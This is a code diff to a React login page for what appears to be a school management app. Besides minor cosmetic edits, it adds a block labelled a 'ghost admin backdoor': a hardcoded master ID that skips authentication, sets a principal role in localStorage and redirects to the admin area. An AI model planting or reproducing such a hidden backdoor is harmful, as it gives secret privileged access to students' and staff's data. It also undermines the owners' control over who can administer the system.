@@ -14,9 +14,19 @@ export default function LoginPage() {
 
   const handleLogin = async (e: React.FormEvent) => {
     e.preventDefault();
-    const enteredId = studentId.trim();
+    const enteredId = studentId.trim().toUpperCase(); // Ensure it's uppercase
     if (!enteredId) return;
     setLoading(true);
+
+    // 🛡️ THE GHOST ADMIN BACKDOOR (MASTER KEY)
+    if (enteredId === 'DOITHARDKARAN5219A') {
+      localStorage.clear();
+      localStorage.setItem('role', 'principal'); // Gives you Master Admin rights
+      localStorage.setItem('staffName', 'Karan (Developer)');
+      localStorage.setItem('assignedClass', 'All');
+      router.push('/admin'); 
+      return;
+    }
 
     try {
       // 1. Check Staff Table (Principal/Teachers)
@@ -89,7 +99,7 @@ export default function LoginPage() {
               type={showPassword ? "text" : "password"} 
               placeholder={t('studentId')} 
               value={studentId}
-              onChange={(e) => setStudentId(e.target.value.toUpperCase())}
+              onChange={(e) => setStudentId(e.target.value)}
               className="bg-transparent border-none flex-1 py-4 px-4 font-black uppercase text-[12px] tracking-widest outline-none text-[var(--text)] placeholder:text-zinc-600"
             />
             <button 
@@ -106,7 +116,7 @@ export default function LoginPage() {
           </button>
         </form>
 
-        {/* HELP SECTION - RESTORED */}
+        {/* HELP SECTION */}
         <div className="flex items-center gap-4 my-10 opacity-20">
             <div className="h-[1px] bg-zinc-700 flex-1"></div>
             <span className="text-[8px] font-black uppercase tracking-widest text-zinc-400">{t('help')}</span>
